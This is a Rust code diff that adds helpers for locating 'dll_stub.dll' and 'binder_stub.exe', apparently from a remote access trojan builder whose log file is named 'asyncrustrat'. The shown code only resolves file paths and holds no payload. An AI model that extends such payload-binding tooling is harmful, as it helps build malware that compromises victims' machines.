@@ -87,6 +87,46 @@ pub fn get_client_built_exe_path() -> Result<PathBuf, String> {
     Ok(path)
 }
 
+pub fn get_dll_stub_path() -> Result<PathBuf, String> {
+    let exe_dir = get_exe_dir()?;
+    let stub_filename = "dll_stub.dll";
+
+    let path_in_exe_dir = exe_dir.join(stub_filename);
+    if path_in_exe_dir.exists() {
+        return Ok(path_in_exe_dir);
+    }
+
+    let path_in_stub_dir = exe_dir.join("stub").join(stub_filename);
+    if path_in_stub_dir.exists() {
+        return Ok(path_in_stub_dir);
+    }
+
+    Err(format!(
+        "dll_stub.dll not found at {:?} or {:?}. Please ensure it is correctly placed.",
+        path_in_exe_dir, path_in_stub_dir
+    ))
+}
+
+pub fn get_binder_stub_path() -> Result<PathBuf, String> {
+    let exe_dir = get_exe_dir()?;
+    let stub_filename = "binder_stub.exe";
+
+    let path_in_exe_dir = exe_dir.join(stub_filename);
+    if path_in_exe_dir.exists() {
+        return Ok(path_in_exe_dir);
+    }
+
+    let path_in_stub_dir = exe_dir.join("stub").join(stub_filename);
+    if path_in_stub_dir.exists() {
+        return Ok(path_in_stub_dir);
+    }
+
+    Err(format!(
+        "binder_stub.exe not found at {:?} or {:?}. Please ensure it is correctly placed.",
+        path_in_exe_dir, path_in_stub_dir
+    ))
+}
+
 pub fn log_to_file(message: &str) {
     let log_file_name = "asyncrustrat_logs.txt";
     let temp_dir = std::env::temp_dir(); // Gets the system's temporary directory (e.g., %TEMP%)
